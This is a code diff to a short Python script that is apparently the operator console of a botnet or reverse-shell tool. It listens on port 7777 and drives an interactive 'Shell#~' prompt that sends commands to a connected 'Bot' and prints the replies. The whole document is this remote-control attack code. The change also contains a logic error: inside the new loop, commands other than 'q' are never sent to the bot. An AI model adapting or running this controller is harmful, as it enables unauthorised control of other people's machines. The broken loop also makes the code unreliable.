@@ -1,5 +1,4 @@
 import socket
-from pexpect import pxssh
 from termcolor import colored
 
 def setup(p):
@@ -20,10 +19,14 @@ def setup(p):
     print(f"Connection with Bot {address} has been terminated")
 
 def shell():
-    command = input(colored("* Shell#~%s: " % str(address), 'green'))
-    bot.send(command.encode('utf-8'))
-    message = bot.recv(1024)
-    print(message.decode('utf-8'))
+    while True:
+        command = input(colored("* Shell#~%s: " % str(address), 'green'))
+        if command == 'q':
+            bot.send(command.encode('utf-8'))
+            break
+        else:
+            message = bot.recv(1024)
+            print(message.decode('utf-8'))
 
 setup(7777)
 shell()
